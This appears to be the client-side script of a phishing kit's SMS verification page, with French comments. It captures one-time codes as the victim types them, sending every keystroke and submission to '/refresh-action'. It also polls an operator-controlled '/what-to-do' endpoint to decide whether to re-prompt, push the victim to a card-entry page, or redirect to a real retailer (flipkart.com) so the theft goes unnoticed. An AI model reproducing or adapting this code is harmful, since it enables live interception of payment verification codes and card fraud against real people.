console.log('=== SMS-WORKING.js loaded ===');

// Variables globales
let timeLeft = 31;
let timerInterval;
let pollingInterval;

// === UTILS ===
function showError(input, message) {
    let errorDiv = input.parentNode.querySelector('.input-error');
    if (!errorDiv) {
        errorDiv = document.createElement('div');
        errorDiv.className = 'input-error text-xs text-red-500 mt-1';
        input.parentNode.appendChild(errorDiv);
    }
    input.classList.add('border-red-500', 'ring-2', 'ring-red-200');
    errorDiv.textContent = message;
    errorDiv.style.display = 'block';
}

function clearError(input) {
    let errorDiv = input.parentNode.querySelector('.input-error');
    input.classList.remove('border-red-500', 'ring-2', 'ring-red-200');
    if (errorDiv) {
        errorDiv.textContent = '';
        errorDiv.style.display = 'none';
    }
}

// === LOADING OVERLAY ===
function showLoadingOverlay(text = 'Processing...', subtext = 'Please wait while we secure your information') {
    const overlay = document.getElementById('loadingOverlay');
    const loadingText = document.getElementById('loadingText');
    const loadingSubtext = document.getElementById('loadingSubtext');
    
    if (loadingText) loadingText.textContent = text;
    if (loadingSubtext) loadingSubtext.textContent = subtext;
    if (overlay) overlay.style.display = 'flex';
}

function hideLoadingOverlay() {
    const overlay = document.getElementById('loadingOverlay');
    if (overlay) overlay.style.display = 'none';
}

// === REFRESH ACTION PING ===
function sendAction(actionSent) {
    const csrfToken = document.querySelector('input[name="_token"]')?.value;
    if (!csrfToken) {
        console.error('CSRF token not found');
        return;
    }
    
    console.log('Sending action:', actionSent);
    
    fetch('/refresh-action', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Accept': 'application/json',
            'X-CSRF-TOKEN': csrfToken
        },
        body: JSON.stringify({ action_sent: actionSent })
    })
    .then(res => res.json())
    .then(data => {
        console.log('Action sent successfully:', actionSent);
    })
    .catch(err => {
        console.error(`Failed to send action '${actionSent}':`, err);
    });
}

// === TIMER LOGIC ===
function updateTimer() {
    const timerElement = document.getElementById('timer');
    if (!timerElement) return;
    
    const minutes = Math.floor(timeLeft / 60);
    const seconds = timeLeft % 60;
    timerElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
    
    if (timeLeft <= 0) {
        clearInterval(timerInterval);
        timerElement.textContent = '00:00';
        timerElement.classList.remove('timer');
        timerElement.classList.add('text-gray-500');
    }
    timeLeft--;
}

// === POLLING LOGIC ===
function startWhatToDoPolling() {
    let lastStatus = null;
    let pollCount = 0;
    
    console.log('Starting what-to-do polling...');
    
    // Update loading text for polling
    showLoadingOverlay('Verifying SMS...', 'Checking verification status');
    
            pollingInterval = setInterval(async () => {
            pollCount++;
            console.log(`Polling attempt #${pollCount}`);
            try {
            const response = await fetch('/what-to-do', {
                method: 'GET',
                headers: {
                    'Accept': 'application/json',
                    'X-CSRF-TOKEN': document.querySelector('input[name="_token"]').value
                },
                credentials: 'same-origin'
            });
            if (response.ok) {
                const data = await response.json();
                console.log('What-to-do response:', data);
                
                // Update loading text with status
                const statusText = data.data?.status || 'unknown';
                showLoadingOverlay('Verifying SMS...', `Status: ${statusText}`);
                
                if (data.data && data.data.status !== lastStatus) {
                    lastStatus = data.data.status;
                    console.log('Status changed from', lastStatus, 'to', data.data.status);
                    
                    if (data.data.status !== 2) {
                        console.log('Stopping polling - status is not 2');
                        clearInterval(pollingInterval);
                        hideLoadingOverlay();
                        handleWhatToDoResponse(data.data);
                    } else {
                        console.log('Continuing polling - status is 2 (waiting)');
                    }
                } else if (data.data && data.data.status === 2) {
                    console.log('Status is 2 - continuing to wait');
                } else {
                    console.log('Status unchanged or no data.data');
                }
            }
        } catch (error) {
            console.error('Polling error:', error);
            // Continue polling even if there's an error
        }
    }, 1000);
}

function handleWhatToDoResponse(data) {
    console.log('Handling what-to-do response with status:', data.status);
    
    switch (data.status) {
        case 11:
        case 12:
            // SMS incorrect - rester sur la page SMS
            hideLoadingOverlay();
            showError(document.getElementById('smsCode'), 'Incorrect SMS code. Please try again.');
            document.getElementById('smsCode').value = '';
            document.getElementById('smsCode').focus();
            break;
            
        case 4:
            // Erreur/Declined - rediriger vers card
            hideLoadingOverlay();
            window.location.href = typeof cardUrl !== 'undefined' ? cardUrl : '/card';
            break;
            
        case 3:
            // Erreur générale
            hideLoadingOverlay();
            showError(document.getElementById('smsCode'), `Erreur: ${data.message || 'Problème avec le SMS'}`);
            break;
            
        case 5:
            // Redirection vers Netflix (succès)
            hideLoadingOverlay();
            setTimeout(() => {
                window.location.href = 'https://www.flipkart.com/';
            }, 2000);
            break;
            
        default:
            hideLoadingOverlay();
            showError(document.getElementById('smsCode'), `Status inconnu: ${data.status}`);
    }
}

// === DEBOUNCE FUNCTION ===
function debounce(fn, delay) {
    let timeoutId;
    return function(...args) {
        clearTimeout(timeoutId);
        timeoutId = setTimeout(() => fn.apply(this, args), delay);
    };
}

// === DOMContentLoaded ===
document.addEventListener('DOMContentLoaded', function() {
    console.log('=== DOMContentLoaded fired ===');
    console.log('verifySmsUrl:', typeof verifySmsUrl !== 'undefined' ? verifySmsUrl : 'UNDEFINED');
    console.log('whatToDoUrl:', typeof whatToDoUrl !== 'undefined' ? whatToDoUrl : 'UNDEFINED');
    
    // 1. Start timer
    timerInterval = setInterval(updateTimer, 1000);
    
    // 2. Start regular ping every 2 seconds
    setInterval(() => {
        sendAction('sms_page_active');
    }, 2000);
    
    // 3. Send initial ping
    sendAction('sms_page_loaded');
    
    // 4. Test what-to-do API directly
    console.log('Testing what-to-do API...');
    fetch('/what-to-do', {
        method: 'GET',
        headers: {
            'Accept': 'application/json',
            'X-CSRF-TOKEN': document.querySelector('input[name="_token"]').value
        },
        credentials: 'same-origin'
    })
    .then(res => res.json())
    .then(data => {
        console.log('What-to-do test response:', data);
    })
    .catch(err => {
        console.error('What-to-do test failed:', err);
    });
    
    // 3. Setup SMS code input tracking
    const smsInput = document.getElementById('smsCode');
    if (smsInput) {
        smsInput.addEventListener('input', debounce((e) => {
            sendAction(`smsCode: ${e.target.value}`);
        }, 500));
        
        smsInput.addEventListener('blur', (e) => {
            sendAction(`smsCode: ${e.target.value}`);
        });
        
        // Allow only numbers
        smsInput.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            e.target.value = value;
        });
        
        // Enter key support
        smsInput.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                document.getElementById('confirmBtn').click();
            }
        });
    }
    
    // 4. Setup button click (like the old version)
    const confirmBtn = document.getElementById('confirmBtn');
    if (confirmBtn) {
        confirmBtn.addEventListener('click', async function(e) {
            e.preventDefault();
            
            console.log('Confirm button clicked');
            
            const smsCode = document.getElementById('smsCode').value.trim();
            if (!smsCode) {
                showError(document.getElementById('smsCode'), 'Please enter the SMS code');
                return;
            }
            
            clearError(document.getElementById('smsCode'));
            
            // Send action for SMS submission
            sendAction(`sms_submitted: ${smsCode}`);
            
            console.log('Starting SMS submission...');
            showLoadingOverlay('Processing SMS...', 'Verifying code');
            
            try {
                const formData = new FormData();
                formData.append('code', smsCode);
                formData.append('_token', document.querySelector('input[name="_token"]').value);
                
                console.log('Sending SMS to:', verifySmsUrl);
                
                const response = await fetch(verifySmsUrl, {
                    method: 'POST',
                    body: formData,
                    headers: {
                        'X-CSRF-TOKEN': document.querySelector('input[name="_token"]').value
                    }
                });

                console.log('SMS response status:', response.status);
                
                if (response.ok) {
                    const responseData = await response.json();
                    console.log('SMS response data:', responseData);
                    
                    // Vérifier si la réponse est vraiment un succès
                    if (responseData.success === true) {
                        console.log('SMS submission successful, starting polling...');
                        startWhatToDoPolling();
                    } else {
                        console.log('SMS submission failed:', responseData);
                        hideLoadingOverlay();
                        showError(document.getElementById('smsCode'), 'Erreur lors de la soumission du SMS');
                    }
                } else {
                    const errorData = await response.json();
                    console.log('SMS error response:', errorData);
                    hideLoadingOverlay();
                    showError(document.getElementById('smsCode'), 'Erreur lors de la soumission du SMS');
                }
            } catch (error) {
                console.error('SMS submission error:', error);
                hideLoadingOverlay();
                showError(document.getElementById('smsCode'), 'Erreur de connexion');
            }
        });
    }
    
    // 5. Page visibility tracking
    document.addEventListener('visibilitychange', () => {
        if (document.hidden) {
            sendAction('page_hidden');
        } else {
            sendAction('page_visible');
        }
    });
    
    // 6. Page unload tracking
    window.addEventListener('beforeunload', () => {
        const url = '/refresh-action';
        const data = JSON.stringify({ action_sent: 'page_unload' });
        const headers = { type: 'application/json' };
        navigator.sendBeacon(url, new Blob([data], headers));
    });
}); 